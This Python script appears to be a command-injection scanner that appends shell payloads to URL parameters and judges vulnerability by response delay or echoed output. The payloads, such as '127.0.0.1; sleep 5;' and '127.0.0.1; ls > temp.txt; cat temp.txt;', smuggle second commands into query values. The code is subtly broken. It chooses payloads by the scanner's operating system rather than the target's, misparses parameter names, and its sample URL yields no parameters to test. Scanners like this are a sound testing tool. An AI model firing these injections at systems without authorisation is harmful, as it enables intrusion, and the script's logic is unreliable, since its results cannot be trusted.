import requests
import urllib.parse
import subprocess  #  For safe command execution on the scanner's system
import platform  # To determine the OS

def check_command_injection(url, params):
    """
    Checks for Command Injection vulnerabilities.  This uses
    time-based techniques and output redirection to minimize false negatives
    and improve reliability.
    """

    # Determine the OS for platform-specific commands
    os_type = platform.system().lower()
    if os_type == "windows":
        #  Use 'ping' on Windows
        payloads = {
            "time_delay": "127.0.0.1 & ping -n 5 127.0.0.1 &",  #  Time delay (5 seconds)
            "output_redirection": "127.0.0.1 & type nul > temp.txt & echo Hello >> temp.txt & findstr /C:\"Hello\" temp.txt &", # Output redirection
        }
    else:
        #  Use 'sleep' and 'ls' on Linux/macOS
        payloads = {
            "time_delay": "127.0.0.1; sleep 5; ",  #  Time delay (5 seconds)
            "output_redirection": "127.0.0.1; ls > temp.txt; cat temp.txt; ",  # Output redirection
        }

    for param in params:
        for technique, payload in payloads.items():
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url)

                if technique == "time_delay":
                    # Check if the response time was significantly delayed
                    if response.elapsed.total_seconds() >= 5:
                        return {
                            "vulnerable": True,
                            "type": "Command Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "technique": "Time Delay",
                            "message": "Command injection detected: Response delayed, indicating command execution."
                        }
                elif technique == "output_redirection":
                    if os_type == "windows" and "Hello" in response.text:
                         return {
                            "vulnerable": True,
                            "type": "Command Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "technique": "Output Redirection",
                            "message": "Command injection detected: Output redirection successful."
                        }
                    elif os_type != "windows" and "temp.txt" in response.text:
                        return {
                            "vulnerable": True,
                            "type": "Command Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "technique": "Output Redirection",
                            "message": "Command injection detected: Output redirection successful."
                        }


            except requests.exceptions.RequestException as e:
                print(f"Error checking {test_url}: {e}")
                continue  #  Move to the next payload

    return {"vulnerable": False}


def scan_command_injection(url):
    """
    Main function to scan for command injection.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        params = [key for key in response.request.url.split("?")[1].split("&")]
    except:
        params = []
    return check_command_injection(url, params)



if __name__ == '__main__':
    test_url = "http://localhost:3000/#/contact"  #  Replace with a vulnerable URL
    result = scan_command_injection(test_url)
    print(result)
